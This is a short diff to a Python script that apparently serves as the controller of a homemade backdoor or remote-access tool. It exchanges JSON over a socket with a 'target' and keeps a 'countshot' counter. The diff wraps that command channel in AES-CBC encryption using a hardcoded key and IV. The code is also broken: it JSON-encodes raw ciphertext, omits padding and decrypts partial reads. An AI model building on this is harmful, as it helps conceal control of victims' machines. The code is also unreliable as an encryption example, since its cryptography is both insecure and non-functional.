@@ -4,17 +4,29 @@
 import socket
 import json
 import base64
+from Crypto.Cipher import AES
+
+def do_encrypt(message):
+    obj = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
+    ciphertext = obj.encrypt(message)
+    return ciphertext
+
+def do_decrypt(ciphertext):
+    obj2 = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
+    message = obj2.decrypt(ciphertext)
+    return message
 
 countshot = 1
+
 def send(data):
-	json_data = json.dumps(data)
+	json_data = json.dumps(do_encrypt(data))
 	target.send(json_data)
 def recv():
 	data = ""
 	while True:
 		try:
 			data = data + target.recv(1024)
-			return json.loads(data) 
+			return json.loads(do_decrypt(data)) 
 		except ValueError:
 		       continue 
 
